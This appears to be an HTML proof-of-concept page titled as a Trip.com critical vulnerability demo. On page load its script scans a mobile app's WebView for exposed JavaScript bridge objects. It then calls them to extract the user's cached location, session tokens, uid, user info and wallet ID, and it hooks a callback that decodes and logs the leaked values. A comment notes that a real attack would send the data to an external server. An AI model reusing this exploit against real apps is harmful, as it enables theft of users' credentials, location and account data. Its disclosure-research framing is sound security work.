<!doctype html>
<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Trip.com Critical Vulnerability PoC</title>
    <style>
      body {
        font-family: "Courier New", monospace;
        background: #1a1a1a;
        color: #00ff00;
        padding: 20px;
      }
      .card {
        border: 1px solid #00ff00;
        padding: 15px;
        margin-bottom: 20px;
        background: #000;
        box-shadow: 0 0 10px #00ff00;
      }
      h3 {
        color: #fff;
        text-transform: uppercase;
        border-bottom: 1px solid #00ff00;
      }
      .critical {
        color: #ff0000;
        font-weight: bold;
        text-shadow: 0 0 5px #ff0000;
      }
      #logs {
        white-space: pre-wrap;
        word-wrap: break-word;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <h3>1. Status & Bridges</h3>
      <ul id="bridges">
        Scanning for entry points...
      </ul>
    </div>

    <div class="card">
      <h3>2. Live Data Extraction</h3>
      <div id="logs">> System Initialized...</div>
    </div>

    <script>
      function log(msg, isCritical = false) {
        var box = document.getElementById("logs");
        var prefix = isCritical ? "[CRITICAL] " : "[INFO] ";
        var color = isCritical ? "red" : "#00ff00";
        box.innerHTML += `\n> <span style="color:${color}">${prefix}${msg}</span>`;
        console.log(prefix + msg);
      }

      // --- CRITICAL: Listen for callback wrapped in Base64 (ax0.b / ax0.c) ---
      window.__bridge_callback = function (base64Data) {
        try {
          // Decrypt Base64 (as seen in ax0.b.b)
          var decodedData = atob(base64Data);
          var json = JSON.parse(decodedData);

          log("BRIDGE CALLBACK INTERCEPTED!", true);
          log("Payload: " + decodedData);

          // Extract value from standard response format
          var secret = json.value || (json.param && json.param.value);
          if (secret) {
            log("SUCCESS: Extracted Secret: " + JSON.stringify(secret), true);
            // In a real attack, exfiltrate to external server here
          }
        } catch (e) {
          log("Callback Error: " + e.message, true);
        }
      };

      function startHeist() {
        log("Executing Stealth Extraction...");

        // 1. Precise Location Extraction (Locate_a.getCachedLocationData)
        if (window.Locate_a && window.Locate_a.getCachedLocationData) {
          log("Querying Cached Location...");
          var loc = window.Locate_a.getCachedLocationData();
          if (loc) {
            log("LOCATION LEAKED: " + JSON.stringify(loc), true);
          }
        }

        // 2. Sensitive Storage Extraction (IBUStorageV2_a.IBUGetUserValue)
        if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
          log("Probing Secure Storage (nh.a)...");

          // Targets identified from source code analysis
          var targets = [
            { bus: "common", key: "token" },
            { bus: "common", key: "uid" },
            { bus: "common", key: "vtoken" },
            { bus: "user", key: "userInfo" },
            { bus: "wallet", key: "walletId" }
          ];

          targets.forEach(function(target, index) {
            setTimeout(function() {
              log("Requesting [" + target.key + "] from [" + target.bus + "]...");
              
              // Payloads must be a JSON string that H5URLCommand can parse
              var payload = JSON.stringify({
                callback_tagname: "leak_" + target.key, // Required for tracking
                bussiness: target.bus, // Note: double 's' required by Java source
                key: target.key
              });

              window.IBUStorageV2_a.IBUGetUserValue(payload);
            }, index * 500); // Staggering to avoid congestion
          });
        }
      }

      // Scanner for bridge objects
      setTimeout(function () {
        var found = [];
        var suspicious = ["IBUStorageV2_a", "Locate_a", "Storage", "IBUStorageV2_b", "Wallet_a"];
        
        suspicious.forEach(function(name) {
          if (window[name]) found.push(name);
        });

        document.getElementById("bridges").innerHTML = found.length > 0 
          ? found.map((b) => `<li>[+] Found Bridge: ${b}</li>`).join("")
          : "<li>[-] No target bridges detected.</li>";

        startHeist();
      }, 1000);
    </script>
  </body>
</html>
